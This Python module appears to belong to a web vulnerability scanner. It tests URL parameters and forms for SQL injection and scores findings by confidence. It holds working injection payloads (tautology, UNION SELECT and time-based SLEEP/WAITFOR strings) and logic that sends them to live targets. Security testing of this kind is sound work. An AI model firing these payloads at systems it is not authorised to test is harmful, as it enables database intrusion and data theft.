"""
SQL Injection Detection Module
Tests for SQL injection vulnerabilities
"""

import logging
import time
import re
from typing import Dict, List, Optional
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

import requests

from config import DETECTION_CONFIG
from modules.scan_utils import get_timing_baseline, is_significant_difference
from modules.verification_engine import SQLiEvidenceCapture, VerifiedFinding, Evidence

logger = logging.getLogger(__name__)


class SQLiDetector:
    """
    SQL Injection vulnerability detector
    """

    def _matches_error_pattern(self, response_text_lower: str) -> Optional[str]:
        """Check response text against all configured SQL error patterns
        plus the precise Oracle regex. Returns the matched pattern string,
        or None."""
        for pattern in self.error_patterns:
            if pattern.lower() in response_text_lower:
                return pattern
        if self._ORA_ERROR_RE.search(response_text_lower):
            return self._ORA_ERROR_RE.search(response_text_lower).group(0)
        return None
    
    def __init__(self, session: requests.Session, config: Dict):
        self.session = session
        self.config = config
        self.sqli_config = DETECTION_CONFIG['sql_injection']
        self.error_patterns = self.sqli_config['error_patterns']

        # Precise regex for Oracle errors (ORA-##### format), replacing the
        # old bare "ora-" substring check, which could false-positive on
        # any text that happens to contain that 4-character sequence.
        self._ORA_ERROR_RE = re.compile(r"ora-\d{4,5}", re.IGNORECASE)
        
        # SQL injection payloads
        self.payloads = [
            # Error-based
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            
            # Union-based
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Time-based
            "' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "' AND pg_sleep(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)--",
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "\" AND 1=1--",
            "\" AND 1=2--",
        ]
        
        # Confirmatory payloads
        self.confirmatory = [
            "' AND 1=1--",
            "' AND 1=2--",
        ]

        self.evidence_capture = SQLiEvidenceCapture()

    def verify_url_parameter(self, url: str, param_name: str) -> Optional[Dict]:
        """
        Full verification with confidence score, classification, and
        structured evidence (payload / response A / response B / diff,
        exactly per spec) — returns a finding dict, or None if not
        vulnerable.

        Confidence levels:
          95 — Error-based: actual DB error message captured (Confirmed)
          85 — Boolean-based: TRUE/FALSE responses differ meaningfully by
               real content-similarity comparison (not just length),
               confirmed across two quote styles (Confirmed)
          60 — Time-based: SLEEP() added measurable delay beyond baseline
               (Likely — timing alone is a weaker signal than content proof)
        """
        if not self.test_url_parameter(url, param_name):
            return None

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param_name, [""])[0]

        # Try boolean-based confirmation FIRST since it now produces the
        # richest, most spec-compliant evidence (payload/response/diff).
        bool_evidence = self._confirm_vulnerability_with_evidence(url, param_name, original_value)
        if bool_evidence:
            evidence = Evidence(
                probe_url        = url,
                probe_payload    = bool_evidence["payload_true"],
                comparison_baseline = (
                    f"TRUE payload ('{bool_evidence['payload_true']}'): "
                    f"{bool_evidence['response_a_length']} chars, "
                    f"{bool_evidence['record_count_true']} row-like elements"
                ),
                comparison_payload = (
                    f"FALSE payload ('{bool_evidence['payload_false']}'): "
                    f"{bool_evidence['response_b_length']} chars, "
                    f"{bool_evidence['record_count_false']} row-like elements"
                ),
                comparison_diff = (
                    f"Length difference: {bool_evidence['length_diff']} chars "
                    f"({bool_evidence['length_diff_pct']}%); content similarity "
                    f"TRUE-vs-FALSE: {bool_evidence['similarity_false_vs_true']:.0%} "
                    f"(similarity_true_vs_baseline: {bool_evidence['similarity_true_vs_baseline']:.0%})"
                ),
                matched_pattern   = "Boolean-based: TRUE/FALSE content diverge significantly",
                verification_note = (
                    "Boolean-based SQLi confirmed via content-similarity comparison "
                    "(difflib), not length alone — TRUE payload matches baseline "
                    "similarity, FALSE payload diverges meaningfully in actual content."
                ),
                reproduction_steps = [
                    f"1. Request {url} with '{param_name}' set to: {bool_evidence['payload_true']}",
                    f"2. Request the same URL with '{param_name}' set to: {bool_evidence['payload_false']}",
                    f"3. Compare responses — TRUE returned {bool_evidence['response_a_length']} chars "
                    f"({bool_evidence['record_count_true']} rows), FALSE returned "
                    f"{bool_evidence['response_b_length']} chars ({bool_evidence['record_count_false']} rows).",
                ],
            )
            finding = VerifiedFinding(
                vuln_type   = "SQL Injection",
                url         = url,
                parameter   = param_name,
                severity    = "Critical",
                confidence  = 85,
                owasp       = "A03 – Injection",
                verification_method = "Boolean-based content-similarity comparison (difflib)",
                description = (
                    f"SQL Injection confirmed in parameter '{param_name}': a TRUE "
                    "condition payload produces a response nearly identical to the "
                    "baseline, while a FALSE condition payload produces a content "
                    "structure that diverges significantly — proving the injected "
                    "boolean logic is reaching the underlying SQL query."
                ),
                remediation = "Use parameterized queries / prepared statements for all SQL execution. Never concatenate user input into query strings.",
                evidence    = evidence,
            )
            return finding.to_dict()

        # Fall back to the legacy error/time-based evidence capturer.
        evidence = self.evidence_capture.capture(
            self.session, url, param_name, original_value, self.config
        )

        if "error-based" in evidence.verification_note.lower() or (evidence.matched_pattern and "syntax" in evidence.matched_pattern.lower()):
            confidence = 95
            verification_method = "Error-based — DB error message captured"
        else:
            confidence = 60
            verification_method = "Time-based — response delay correlates with SLEEP() payload"

        finding = VerifiedFinding(
            vuln_type   = "SQL Injection",
            url         = url,
            parameter   = param_name,
            severity    = "Critical",
            confidence  = confidence,
            owasp       = "A03 – Injection",
            verification_method = verification_method,
            description = f"SQL Injection vulnerability confirmed in parameter '{param_name}'.",
            remediation = "Use parameterized queries / prepared statements for all SQL execution.",
            evidence    = evidence,
        )
        return finding.to_dict()
    
    def test_url_parameter(self, url: str, param_name: str) -> bool:
        """
        Test URL parameter for SQL injection.

        Tries THREE independent detection paths, any one of which is
        sufficient: error-based (DB error message leaked), boolean-based
        (TRUE/FALSE content genuinely diverges), and time-based (SLEEP()
        measurably delays the response). Boolean-based detection
        previously only ran as a "confirmation" step AFTER an error
        pattern was found — meaning purely boolean-based SQLi (no error
        string ever appears, which is common with properly-caught
        exceptions on the backend) could never be detected at all. It now
        runs independently.
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if param_name not in params:
                return False
            
            original_value = params[param_name][0]
            
            # Path 1: error-based injection
            for payload in self.payloads:
                params[param_name] = payload
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.config['request_timeout']
                    )
                    
                    # Check for SQL error messages
                    response_text = response.text.lower()
                    matched_pattern = self._matches_error_pattern(response_text)
                    if matched_pattern:
                        logger.warning(f"SQLi (error-based) confirmed in {param_name} at {url}")
                        return True
                
                except requests.Timeout:
                    # Potential time-based injection
                    if self._test_time_based(url, param_name, original_value):
                        logger.warning(f"SQLi (time-based) confirmed in {param_name} at {url}")
                        return True
                except Exception as e:
                    logger.debug(f"Error testing SQLi: {e}")
                    continue

            # Path 2: boolean-based injection — runs independently, not
            # gated behind finding an error pattern first.
            if self._confirm_vulnerability(url, param_name, original_value):
                logger.warning(f"SQLi (boolean-based) confirmed in {param_name} at {url}")
                return True

            return False
            
        except Exception as e:
            logger.error(f"SQLi test error: {e}")
            return False
    
    def test_form(self, form: Dict, url: str) -> Optional[Dict]:
        """
        Test form for SQL injection
        """
        try:
            action = form.get('action', url)
            method = form.get('method', 'GET')
            inputs = form.get('inputs', [])
            
            if not inputs:
                return None
            
            # Build test data
            test_data = {}
            for inp in inputs:
                if inp['type'] not in ['submit', 'button', 'image', 'file']:
                    test_data[inp['name']] = inp['value'] or 'test'
            
            results = {}
            
            for inp in inputs:
                if inp['type'] in ['submit', 'button', 'image', 'file']:
                    continue
                
                field_name = inp['name']
                
                for payload in self.payloads[:5]:  # Test first few payloads
                    test_data_copy = test_data.copy()
                    test_data_copy[field_name] = payload
                    
                    try:
                        if method == 'POST':
                            response = self.session.post(
                                action,
                                data=test_data_copy,
                                timeout=self.config['request_timeout']
                            )
                        else:
                            response = self.session.get(
                                action,
                                params=test_data_copy,
                                timeout=self.config['request_timeout']
                            )
                        
                        response_text = response.text.lower()
                        matched_pattern = self._matches_error_pattern(response_text)
                        if matched_pattern:
                            results[field_name] = {
                                'payload': payload,
                                'pattern_matched': matched_pattern,
                            }
                            return results
                    
                    except Exception as e:
                        logger.debug(f"Form SQLi test error: {e}")
                        continue
            
            return None if not results else results
            
        except Exception as e:
            logger.error(f"Form SQLi test error: {e}")
            return None
    
    def _confirm_vulnerability(self, url: str, param_name: str, original_value: str) -> bool:
        """Boolean wrapper for backward compatibility — see
        _confirm_vulnerability_with_evidence for the full evidence-bearing
        version used by verify_url_parameter()."""
        return self._confirm_vulnerability_with_evidence(url, param_name, original_value) is not None

    def _confirm_vulnerability_with_evidence(self, url: str, param_name: str,
                                             original_value: str) -> Optional[Dict]:
        """
        Confirm SQL injection using classic boolean-based logic, with
        REAL content-similarity comparison (difflib SequenceMatcher) in
        place of a naive response-length check:

          - "<val>' AND '1'='1"  → TRUE condition (query still returns rows)
          - "<val>' AND '1'='2"  → FALSE condition (query returns no rows)

        A simple "lengths differ by >100 chars" check produces false
        positives on pages with dynamic content (timestamps, CSRF tokens,
        ad slots, "X users online" counters) where ANY two requests
        differ. We now require:
          1. The TRUE-payload response to be SIMILAR (high similarity_ratio,
             after normalizing away timestamps/tokens) to the original
             baseline response.
          2. The FALSE-payload response to be MEANINGFULLY DIFFERENT in
             actual content from the TRUE-payload response — not just
             different length, but a real drop in textual/structural
             similarity (and ideally a different record/row count).

        Returns a dict with payload/response-length/diff evidence (matching
        the spec's required SQLi evidence format) or None if not confirmed.
        """
        from modules.scan_utils import compare_responses

        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            def fetch(value: str) -> Optional[str]:
                p = params.copy()
                p[param_name] = value
                new_query = urlencode(p, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                try:
                    return self.session.get(test_url, timeout=self.config.get('request_timeout', 15)).text
                except Exception:
                    return None

            # Baseline: original unmodified value, requested twice to
            # measure natural page variance (dynamic content noise floor)
            baseline_a = fetch(original_value)
            baseline_b = fetch(original_value)
            if baseline_a is None or baseline_b is None:
                return None
            baseline_diff = compare_responses(baseline_a, baseline_b)

            quote_styles = ["'", '"']
            for q in quote_styles:
                true_payload  = f"{original_value}{q} AND {q}1{q}={q}1"
                false_payload = f"{original_value}{q} AND {q}1{q}={q}2"

                true_resp  = fetch(true_payload)
                false_resp = fetch(false_payload)
                if true_resp is None or false_resp is None:
                    continue

                true_vs_baseline = compare_responses(true_resp, baseline_a)
                false_vs_true    = compare_responses(false_resp, true_resp)

                # TRUE payload should look like baseline (similarity at
                # least as high as the page's own natural request-to-
                # request similarity, with a small tolerance).
                true_matches_baseline = true_vs_baseline.similarity_ratio >= (baseline_diff.similarity_ratio - 0.05)

                # FALSE payload should differ MEANINGFULLY from TRUE —
                # genuine content/structure difference, not just length.
                false_differs = false_vs_true.is_meaningfully_different(similarity_threshold=0.90)

                if true_matches_baseline and false_differs:
                    return {
                        "payload_true":          true_payload,
                        "payload_false":         false_payload,
                        "response_a_length":     true_vs_baseline.length_a,
                        "response_b_length":     false_vs_true.length_b,
                        "similarity_true_vs_baseline":  round(true_vs_baseline.similarity_ratio, 3),
                        "similarity_false_vs_true":     round(false_vs_true.similarity_ratio, 3),
                        "length_diff":           false_vs_true.length_diff,
                        "length_diff_pct":       false_vs_true.length_diff_pct,
                        "record_count_true":     false_vs_true.record_count_b,
                        "record_count_false":    false_vs_true.record_count_a,
                        "keyword_diff":          false_vs_true.keyword_diff[:10],
                    }

            return None

        except Exception:
            return None
    
    def _test_time_based(self, url: str, param_name: str, original_value: str) -> bool:
        """
        Test for time-based SQL injection.

        IMPORTANT: We first measure how long the UNMODIFIED request takes
        (the "baseline"). A slow server, rate limiter, or congested network
        can easily take 1-2+ seconds on its own. The old logic flagged ANY
        request that timed out at >= (delay - 1) seconds — which would
        misfire on any naturally slow page. We now require the SLEEP
        payload to add roughly the FULL configured delay ON TOP OF the
        baseline, which is the actual signature of a working time-based
        injection.
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            delay = self.sqli_config['time_based_delay']

            # Baseline: how long does a normal request take?
            baseline_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), parsed.fragment
            ))
            baseline_time = get_timing_baseline(self.session, baseline_url, self.config, samples=2)

            time_payloads = [
                f"{original_value}' AND SLEEP({delay})--",
                f"{original_value}\" AND SLEEP({delay})--",
                f"{original_value}' AND pg_sleep({delay})--",
            ]

            # Allow generous per-request budget so the payload has time to
            # actually sleep, but cap it so we don't hang forever.
            request_timeout = baseline_time + delay + 5

            for payload in time_payloads:
                p = params.copy()
                p[param_name] = payload
                new_query = urlencode(p, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                start_time = time.time()
                try:
                    self.session.get(test_url, timeout=request_timeout)
                    elapsed = time.time() - start_time
                except requests.Timeout:
                    elapsed = time.time() - start_time

                extra_delay = elapsed - baseline_time
                # Require the payload to have added ~the full SLEEP duration
                # (allow 1s tolerance for jitter), not just "took a while".
                if extra_delay >= (delay - 1):
                    logger.warning(
                        f"Time-based SQLi candidate in {param_name} at {url}: "
                        f"baseline={baseline_time:.2f}s, with payload={elapsed:.2f}s "
                        f"(extra={extra_delay:.2f}s, expected~{delay}s)"
                    )
                    return True

            return False

        except Exception:
            return False
